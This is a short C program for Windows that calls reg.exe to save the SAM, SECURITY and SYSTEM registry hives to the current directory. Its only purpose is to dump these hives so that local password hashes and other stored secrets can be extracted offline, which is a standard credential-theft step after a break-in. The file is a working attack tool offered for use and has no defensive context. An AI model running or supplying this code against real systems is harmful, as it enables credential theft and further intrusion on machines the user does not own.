#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

int main(void)
{
  printf("extracting sam\n");
  system("reg.exe save hklm\\sam .\\sam.save");
  printf("extracting security\n");
  system("reg.exe save hklm\\security .\\security.save");
  printf("extracting system\n");
  system("reg.exe save hklm\\system .\\system.save");
  printf("all hives are extracted to current directory\n");
  return 0;
}